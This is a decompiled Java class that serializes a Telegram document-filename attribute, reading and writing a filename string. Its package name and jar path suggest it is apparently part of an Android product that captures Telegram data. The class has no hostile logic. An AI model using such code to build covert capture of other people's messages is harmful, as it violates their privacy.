package com.vvt.capture.telegram.internal;

public class TLRPC$TL_documentAttributeFilename
  extends TLRPC.DocumentAttribute
{
  public static int constructor = 358154344;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.file_name = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.file_name;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_documentAttributeFilename.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */